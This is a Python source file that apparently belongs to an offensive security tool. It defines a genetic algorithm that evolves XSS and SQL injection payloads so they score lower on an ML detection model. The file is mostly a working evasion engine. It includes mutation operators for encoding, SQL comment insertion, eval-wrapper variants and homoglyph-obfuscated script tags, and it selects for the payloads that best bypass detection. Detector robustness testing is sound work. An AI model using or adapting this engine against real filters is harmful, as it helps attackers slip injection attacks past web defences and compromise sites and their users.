class GeneticEvolutionEngine:
    """
    Evolves payloads through natural selection.
    
    Payloads that score lower on ML detection are more likely to
    survive and reproduce, creating offspring with even lower scores.
    """

    MUTATION_OPERATORS = [
        "character_case_swap",
        "html_entity_encode",
        "url_encode",
        "unicode_escape",
        "whitespace_variation",
        "comment_insertion",
        "string_concat",
        "eval_wrapper_variation",
        "tag_name_obfuscation",
        "attribute_order_swap",
        "add_benign_tokens",
    ]

    def __init__(
        self,
        population_size: int = 20,
        generations: int = 50,
        mutation_rate: float = 0.3,
        crossover_rate: float = 0.5,
        elite_size: int = 3,
        target_score: float = 0.1,
    ) -> None:
        """
        Initialize the evolution engine.

        Args:
            population_size: Number of payloads per generation
            generations: Maximum number of generations
            mutation_rate: Probability of mutation per payload
            crossover_rate: Probability of crossover between parents
            elite_size: Number of best payloads kept unchanged
            target_score: Stop evolution when best score reaches this
        """
        self.population_size = population_size
        self.generations = generations
        self.mutation_rate = mutation_rate
        self.crossover_rate = crossover_rate
        self.elite_size = elite_size
        self.target_score = target_score

    def evolve(self, original_payload: str, category: PayloadCategory) -> EvolutionResult:
        """
        Evolve a payload through multiple generations.

        Args:
            original_payload: The starting payload
            category: Type of payload (XSS, SQLi, etc.)

        Returns:
            Complete EvolutionResult
        """
        start_time = time.time()

        # Create initial population
        original = Payload(content=original_payload, category=category)
        population = self._create_initial_population(original)

        population_history = [population.copy()]
        fitness_curve = [self._calculate_population_fitness(population)]
        total_mutations = 0

        logger.info("evolution_started", original_score=original.detection_score,
                   population_size=self.population_size, generations=self.generations)

        for generation in range(self.generations):
            # Score all payloads
            for payload in population:
                payload.detection_score = DetectionSimulator.score_payload(payload.content)
                payload.fitness_score = 1.0 - payload.detection_score
                payload.bypass_probability = 1.0 - payload.detection_score
                payload.generation = generation + 1

            # Sort by fitness (higher is better)
            population.sort(key=lambda p: p.fitness_score, reverse=True)

            best = population[0]
            avg_fitness = self._calculate_population_fitness(population)

            logger.debug("generation_complete", generation=generation + 1,
                        best_score=f"{best.detection_score:.3f}",
                        avg_fitness=f"{avg_fitness:.3f}")

            fitness_curve.append(avg_fitness)

            # Check if target reached
            if best.detection_score <= self.target_score:
                logger.info("target_score_reached", generation=generation + 1,
                          score=best.detection_score)
                break

            # Create next generation
            next_population = []

            # Keep elite
            next_population.extend(population[:self.elite_size])

            # Breed rest of population
            while len(next_population) < self.population_size:
                # Select parents (tournament selection)
                parent1 = self._tournament_select(population)
                parent2 = self._tournament_select(population)

                # Crossover
                if random.random() < self.crossover_rate:
                    child_content = self._crossover(parent1.content, parent2.content)
                else:
                    child_content = parent1.content

                # Mutation
                if random.random() < self.mutation_rate:
                    child_content = self._mutate(child_content, category)
                    total_mutations += 1

                child = Payload(
                    content=child_content,
                    category=category,
                    parent_ids=[parent1.id, parent2.id],
                )

                next_population.append(child)

            population = next_population[:self.population_size]
            population_history.append(population.copy())

        # Final scoring
        for payload in population:
            payload.detection_score = DetectionSimulator.score_payload(payload.content)
            payload.fitness_score = 1.0 - payload.detection_score
            payload.bypass_probability = 1.0 - payload.detection_score

        population.sort(key=lambda p: p.fitness_score, reverse=True)

        elapsed = time.time() - start_time

        result = EvolutionResult(
            original_payload=original,
            best_payload=population[0],
            generations=len(population_history),
            population_history=population_history,
            fitness_curve=fitness_curve,
            total_mutations=total_mutations,
            time_elapsed=elapsed,
            final_bypass_probability=population[0].bypass_probability,
        )

        logger.info("evolution_complete",
                   original_score=f"{original.detection_score:.3f}",
                   best_score=f"{result.best_payload.detection_score:.3f}",
                   improvement=f"{(original.detection_score - result.best_payload.detection_score) * 100:.0f}%",
                   generations=result.generations,
                   mutations=total_mutations,
                   elapsed=f"{elapsed:.1f}s")

        return result

    def _create_initial_population(self, original: Payload) -> List[Payload]:
        """Create initial population with variations of the original."""
        population = [original]

        for _ in range(self.population_size - 1):
            # Create mutated copies
            mutated = self._mutate(original.content, original.category)
            variant = Payload(
                content=mutated,
                category=original.category,
                parent_ids=[original.id],
            )
            population.append(variant)

        return population

    def _tournament_select(self, population: List[Payload], tournament_size: int = 3) -> Payload:
        """Select a parent using tournament selection."""
        tournament = random.sample(population, min(tournament_size, len(population)))
        return max(tournament, key=lambda p: p.fitness_score)

    def _crossover(self, content1: str, content2: str) -> str:
        """Perform crossover between two payload strings."""
        if not content1 or not content2:
            return content1 or content2

        # Single-point crossover
        point1 = random.randint(0, len(content1) - 1) if len(content1) > 1 else 0
        point2 = random.randint(0, len(content2) - 1) if len(content2) > 1 else 0

        return content1[:point1] + content2[point2:]

    def _mutate(self, content: str, category: PayloadCategory) -> str:
        """Apply a random mutation operator."""
        operator = random.choice(self.MUTATION_OPERATORS)
        return self._apply_mutation(content, operator, category)

    def _apply_mutation(self, content: str, operator: str, category: PayloadCategory) -> str:
        """Apply a specific mutation operator."""
        mutations = {
            "character_case_swap": self._mutate_case_swap,
            "html_entity_encode": self._mutate_html_entity,
            "url_encode": self._mutate_url_encode,
            "unicode_escape": self._mutate_unicode_escape,
            "whitespace_variation": self._mutate_whitespace,
            "comment_insertion": self._mutate_comment_insert,
            "string_concat": self._mutate_string_concat,
            "eval_wrapper_variation": self._mutate_eval_wrapper,
            "tag_name_obfuscation": self._mutate_tag_obfuscation,
            "attribute_order_swap": self._mutate_attribute_swap,
            "add_benign_tokens": lambda c: self._mutate_add_benign(c, category),
        }

        return mutations.get(operator, lambda c: c)(content)

    def _mutate_case_swap(self, content: str) -> str:
        """Randomly swap case of characters."""
        result = []
        for char in content:
            if random.random() < 0.3:
                result.append(char.swapcase())
            else:
                result.append(char)
        return "".join(result)

    def _mutate_html_entity(self, content: str) -> str:
        """Encode some characters as HTML entities."""
        chars_to_encode = random.sample(
            list(set(content)), min(3, len(set(content)))
        )
        for char in chars_to_encode:
            entity = f"&#{ord(char)};"
            if random.random() < 0.5:
                content = content.replace(char, entity, 1)
        return content

    def _mutate_url_encode(self, content: str) -> str:
        """URL-encode random characters."""
        chars = list(content)
        for i in range(len(chars)):
            if random.random() < 0.2:
                chars[i] = f"%{ord(chars[i]):02X}"
        return "".join(chars)

    def _mutate_unicode_escape(self, content: str) -> str:
        """Escape characters as Unicode."""
        chars = list(content)
        for i in range(len(chars)):
            if random.random() < 0.15:
                chars[i] = f"\\u{ord(chars[i]):04x}"
        return "".join(chars)

    def _mutate_whitespace(self, content: str) -> str:
        """Add random whitespace variations."""
        # Replace spaces with tabs or multiple spaces
        if random.random() < 0.5:
            content = content.replace(" ", "\t")
        else:
            content = content.replace(" ", "  ")
        return content

    def _mutate_comment_insert(self, content: str) -> str:
        """Insert random comments to break pattern matching."""
        comments = [
            "/**/", "/*comment*/", "<!-- -->", 
            "/*!50000*/", "/*12345*/", "<!--/*-->",
        ]
        comment = random.choice(comments)
        if len(content) > 2:
            pos = random.randint(0, len(content) - 1)
            content = content[:pos] + comment + content[pos:]
        return content

    def _mutate_string_concat(self, content: str) -> str:
        """Split strings with concatenation."""
        if len(content) > 4:
            pos = random.randint(1, len(content) - 2)
            content = content[:pos] + '"+"' + content[pos:]
        return content

    def _mutate_eval_wrapper(self, content: str) -> str:
        """Wrap in different eval variants."""
        wrappers = [
            f"eval('{content}')",
            f"(0, eval)('{content}')",
            f"window['eval']('{content}')",
            f"[].constructor.constructor('{content}')()",
        ]
        return random.choice(wrappers)

    def _mutate_tag_obfuscation(self, content: str) -> str:
        """Obfuscate HTML tag names."""
        content = content.replace("<script", "<scrİpt")
        content = content.replace("<img", "<İmg")
        content = content.replace("<svg", "<svG")
        return content

    def _mutate_attribute_swap(self, content: str) -> str:
        """Swap attribute order in HTML tags."""
        # Simple implementation: reverse attribute-like patterns
        return content.replace(" onerror=", " onload= onerror=")

    def _mutate_add_benign(self, content: str, category: PayloadCategory) -> str:
        """Add benign tokens to dilute detection score."""
        mutated, tokens = BenignTokenInjector.inject_tokens(
            content,
            num_tokens=random.randint(1, 4),
            strategy=random.choice(BenignTokenInjector.INJECTION_STRATEGIES),
        )
        return mutated

    @staticmethod
    def _calculate_population_fitness(population: List[Payload]) -> float:
        """Calculate average fitness of a population."""
        if not population:
            return 0.0
        return sum(p.fitness_score for p in population) / len(population)


